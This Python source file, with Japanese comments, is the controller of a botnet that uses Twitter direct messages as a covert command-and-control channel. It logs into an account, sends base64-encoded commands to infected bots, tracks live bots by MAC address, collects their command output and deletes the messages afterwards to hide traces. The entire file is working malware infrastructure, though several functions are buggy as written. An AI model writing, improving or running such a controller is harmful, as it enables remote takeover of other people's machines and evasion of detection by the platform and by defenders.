from bs4 import BeautifulSoup
from requests.exceptions import ConnectionError
import json
import base64
import requests
import random
import sys
import string
import time

#セッションを生成する
SESSION = requests.Session()
RESPONSE = ""
AUTH_TOKEN = ""
USERNAME = ""
PASSWORD = ""
DM_LINK = "https://twitter.com/messages/with/conversation?id=459072132-459072132&last_note_ts=3"
WAIT_TIME = 120
BOTS_ALIVE = []
BOTS_MACADDR = []
COMMANDS = []
JOB_LIST = []

class CommandToExecute:
    def __init__(self, message):
        try:
            data = json.loads(base64.b64decode(message))
            self.data = data
            self.sender = data['sender']
            self.receiver = data['receiver']
            self.output = data['output']
            self.cmd = data['cmd']
            self.jobid = data['jobid']
        except:
            sys.exit()

    def retrieve_command(self):
        return self.jobid, self.cmd

class CommandToSend:
    def __init__(self, sender, receiver, cmd):
        self.sender = sender
        self.receiver = receiver
        self.cmd = cmd
        self.jobid = ''.join(random.sample(string.ascii_letters + string.digits, 7))

    def build(self):
        cmd = {'sender': self.sender,
               'receiver': self.receiver,
               'cmd': self.cmd,
               'jobid': self.jobid
               }
        return base64.b64encode(json.dumps(cmd))

    def get_jobid(self):
        return self.jobid

class CommandOutput:
    def __init__(self, message):
        try:
            data = json.loads(base64.b64decode(message))
            self.data = data
            self.sender = data['sender']
            self.receiver = data['receiver']
            self.output = data['output']
            self.cmd = data['cmd']
            self.jobid = data['jobid']
        except:
            pass
            #raise DecodingException('Error decoding message: %s' % message)

    def get_jobid(self):
        return self.jobid

    def get_sender(self):
        return self.sender

    def get_receiver(self):
        return self.receiver

    def get_cmd(self):
        return self.cmd

    def get_output(self):
        return self.output

def dm_delete(self):
    global SESSION,RESPONSE,AUTH_TOKEN,JOB_LIST,BOTS_ALIVE,COMMANDS

    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-encoding": "gzip, deflate, sdch, br",
        "accept-language": "ja,en-US;q=0.8,en;q=0.6",
        "User-Agent": "Mozilla/5.0",
        "referer": "https://twitter.com/",
        "x-requested-with": "XMLHttpRequest"
    }

    delete = {
        "authenticity_token": AUTH_TOKEN,
        "conversation_id": "459072132-4590272132",
        "cursor": "GRwmhICpjZzZjYsVFoiAq7nY75OLFSUkAAA",
        "id": ""
    }

    try:
        delete['authenticity_token'] = AUTH_TOKEN
        #r00tappleのダイレクトメッセージ
        dm = SESSION.get(DM_LINK, allow_redirects=False, headers=headers, cookies=RESPONSE.cookies)
    except:
        print("[+]ダイレクトメッセージの取得失敗")
        #再ログイン
        login()
        #処理を中断して終了
        sys.exit()

    #DMのJSONを取得
    dm = dm.json()
    #itemsを取得
    items = dm['items']
    #各種変数を更新
    del_count = 0
    for line in dm['items']:
        try:
            soup = BeautifulSoup(items[line], "lxml")
            #ダイレクトメッセージのIDを取得
            delete['id'] = soup.find('div', attrs={'class':'DirectMessage'}).get('data-item-id')
            RESPONSE = SESSION.post("https://twitter.com/i/direct_messages/destroy", data=delete, allow_redirects=False, headers=headers, cookies=RESPONSE.cookies)
            del_count += 1
        except:
            pass

    print("[+]" + str(del_count) + "件の命令を削除しました")

def dm_receive(self):
    global SESSION,RESPONSE,AUTH_TOKEN,JOB_LIST,BOTS_ALIVE,COMMANDS

    headers = {
        "accept": "application/json, text/javascript, */*; q=0.01",
        "accept-encoding": "gzip, deflate, sdch, br",
        "accept-language": "ja,en-US;q=0.8,en;q=0.6",
        "User-Agent": "Mozilla/5.0",
        "referer": "https://twitter.com/",
        "x-requested-with": "XMLHttpRequest"
    }

    try:
        #自分のアカウンのダイレクトメッセージのURLを記述
        dm = SESSION.get(DM_LINK, allow_redirects=False, headers=headers, cookies=RESPONSE.cookies)
    except:
        print("[+]ダイレクトメッセージの取得失敗")
        #再ログイン
        login()
        #処理を中断して終了
        sys.exit()

    #DMのJSONを取得
    dm = dm.json()
    #itemsを取得
    items = dm['items']
    #各種変数を更新
    del_count = 0
    for line in dm['items']:
        try:
            soup = BeautifulSoup(items[line], "lxml")
            #ダイレクトメッセージのIDを取得
            message = soup.find('p', attrs={'class':'tweet-text'}).string
            message = CommandOutput(message)
            jobid = message.get_jobid()
            cmd = message.get_cmd()
            if (jobid in JOB_LIST and cmd == "PING"):
                #リスト内に同一のボットがない場合リストに追加
                list_bots_macaddr = "".join(BOTS_MACADDR)
                flag = list_bots_macaddr.find(message.get_sender())
                if flag != -1:
                    pass
                else:
                    BOTS_MACADDR.append(message.get_sender())
                    BOTS_ALIVE.append(message)
            elif (jobid not in JOB_LIST):
                COMMANDS.append(message)

        except:
            #refreshコマンドなどで送信した命令もここで受診するため、exceptはpassにする
            pass

    print("[+] BOTの情報を更新しました")
    print("[+] 現在のBOT：" + str(len(BOTS_MACADDR)))
    print("[+] 現在のコマンド数：" + str(len(COMMANDS)))

def dm_send(message):
    #使用するグローバル変数を読みだす
    global SESSION,RESPONSE,AUTH_TOKEN

    headers = {
        "User-Agent": "Mozilla/5.0",
        "referer": "https://twitter.com/"
    }

    send = {
        "authenticity_token": AUTH_TOKEN,
        "conversation_id": "459072132-4590272132",
        "scribeContext[component]": "tweet_box_dm",
        "tagged_users": "",
        "text": message,
        "tweetboxid": "swift_tweetbox_1469593526714"
    }

    #DM送信処理
    try:
        RESPONSE = SESSION.post("https://twitter.com/i/direct_messages/new", data=send, allow_redirects=False, headers=headers, cookies=RESPONSE.cookies)
        #ステータスコードの比較
        if RESPONSE.status_code == 200:
            print("[+]命令送信完了 HTTP status：" + RESPONSE.status_code)
        else:
            print("[+]命令送信失敗 HTTP status：" + RESPONSE.status_code)

    except:
        print("[+]ダイレクトメッセージの送信失敗")
        # 再ログイン
        login()

def login(self):
    global SESSION,RESPONSE,AUTH_TOKEN

    headers = {
        "User-Agent": "Mozilla/5.0",
        "referer": "https://twitter.com/"
    }

    payload = {
        "session[username_or_email]": USERNAME,
        "session[password]": PASSWORD,
        "remember_me": "1",
        "return_to_ssl": "true",
        "scribe_log": "",
        "redirect_after_login": "/",
        "authenticity_token": ""
    }

    try:
        RESPONSE = SESSION.post("https://twitter.com/", allow_redirects=False, headers=headers)
        soup = BeautifulSoup(RESPONSE.text, "lxml")
        AUTH_TOKEN = soup.find(attrs={'name': 'authenticity_token'}).get('value')
        payload['authenticity_token'] = AUTH_TOKEN
        #ログイン
        RESPONSE = SESSION.post("https://twitter.com/sessions", data=payload, allow_redirects=False, headers=headers)

    except Exception as e:
        print("[+]ログインに失敗しました")

def refresh(self):
    global JOB_LIST,WAIT_TIME

    print("[+]起動中のボットを確認する命令を生成中")
    #CmmandToSend(送信者, 受信者, 命令)
    cmd = CommandToSend('master', 'master', 'PING')
    dm_send(cmd.build())
    time.sleep(WAIT_TIME)
    dm_receive()
    JOB_LIST.append(cmd.get_jobid())

def list_bots(self):
    if (len(BOTS_ALIVE) == 0):
        print("[+]No bots alive")
        return
    for bot in BOTS_ALIVE:
        print("%s: %s" % (bot.get_sebder(), bot.get_output()))

def list_commands(self):
    if (len(COMMANDS) == 0):
        print("[+]No commands loaded")
        return
    for command in COMMANDS:
        print("%s: '%s' on %s" % (command.get_jobid(), command.get_cmd(), command.get_sender()))

def retrieve_command(id_command):
    for command in COMMANDS:
        if (command.get_jobid() == id_command):
            print("%s: %s" % (command.get_jobid(), command.get_output()))
            return
    print("[+]Did not manage to retrive the output")

def help(self):
    print("""""
    refresh               - 起動中おBOTとコマンド結果の更新
    reload                - コマンド結果の更新
    list_bots             - 動作中のBOT一覧
    list_cmmands          - 命令したコマンド一覧
    !retrieve <jobid>     - 命令したコマンド結果を表示
    !cmd <MAC ADDRESS>    - BOTに命令を送信
    delete                - 命令の全削除
    help                  - ヘルプの表示
    exit                  - プログラムの終了
   """)

def main(self):
    #ログイン
    login()
    #起動中に送受信を行う事でデータを取得更新する
    refresh()
    #無限ループで入力値取得
    while True:
        cmd_to_launch = input('$ ')
        if (cmd_to_launch == 'refresh'):
            refresh()
        elif (cmd_to_launch == 'reload'):
            dm_receive()
        elif (cmd_to_launch == 'list_bots'):
            list_bots()
        elif (cmd_to_launch == 'list_commands'):
            list_commands()
        elif (cmd_to_launch == 'delete'):
            dm_delete()
        elif (cmd_to_launch == 'help'):
            help()
        elif (cmd_to_launch == 'exit'):
            sys.exit()
        else:
            cmd_to_launch = cmd_to_launch.split(' ')
            if (cmd_to_launch[0] == '!cmd'):
                cmd = CommandToSend('master', cmd_to_launch[1], ' '.join(cmd_to_launch[2:]))
                dm_send(cmd.build())
                print("[+]Sent command '%s' with jobid: %s" % (' '.join(cmd_to_launch[2:]), cmd.get_jobid()))
            elif (cmd_to_launch == '!retrieve'):
                retrieve_command(cmd_to_launch[1])
            else:
                print("[!]Unrecognized command")

if __name__ == '__main__':
    main()
